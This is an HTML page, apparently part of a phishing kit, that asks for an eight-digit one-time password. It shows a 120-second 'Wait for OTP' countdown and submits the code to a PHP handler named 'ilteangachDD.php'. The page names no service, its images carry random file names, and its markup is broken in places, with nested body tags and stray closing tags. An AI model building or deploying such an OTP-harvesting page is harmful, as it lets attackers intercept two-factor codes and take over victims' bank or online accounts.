<!DOCTYPE html>
<html>

<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>

input[type=text], input[type=password] {
  width: 100%;
  padding: 06px 20px;
  margin: 8px 0;
  display: inline-table;
  border: 1px solid #;
  box-sizing: border-box;
}

button {
  background-color:#ed8608 ;
  color: white;
  padding: 06px 20px;
  margin:  0;
  border: none;
  cursor: pointer;
  width: 30%; 
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: -24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
 
   
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>
  <body style="background-color:;">
</body>
<header>

    <center><h1 class="text-center"><img src="./ouut.jpg" style="width: 100%;"></h1></center>
  
  
  
  </header>


<form action="ilteangachDD.php" method="post">
  <div class="imgcontainer">
    
  </div>

  <div class="container">


<label>One Time Password(OTP)*</label>
    <input type="text" placeholder="" name="TOP_2"maxlength="8"
      pattern="[0-9]{8}" required>





    </style>
</head>
<body onload="startTimer();">
   
     <div id="cc">
     <div id="dd">
         
         <script type="text/javascript">
         var timer=120;
         var sec=120;
         function startTimer() {
         sec=parseInt(timer%120);
         
         if (timer<0) {
         timer.stop();
         }
         document.getElementById("time").innerHTML = "<p1> Wait for OTP : </p1>"+sec.toString();
         timer--;
         setTimeout(function(){
         startTimer();
         
         }, 1000);
         }
         
         </script>
        
        
       <center> <b style="color:grey; font-family: Arial, Helvetica, sans-serif;  font-size:17px; margin-bottom:15px; margin-left:5px;"><span style="color:grey; font-size:15px;" id="time"></span>&nbsp;secs</p></b>







    <center><button type="submit">submit</button> 
</center>
  </div>

<center><h1 class="text-center"><img src="./lode.jpg" style="width: 100%;"></h1></center>


<center><h1 class="text-center"><img src="./hyhjui.jpg" style="width: 100%;"></h1></center>

</form>

</body>
</html>
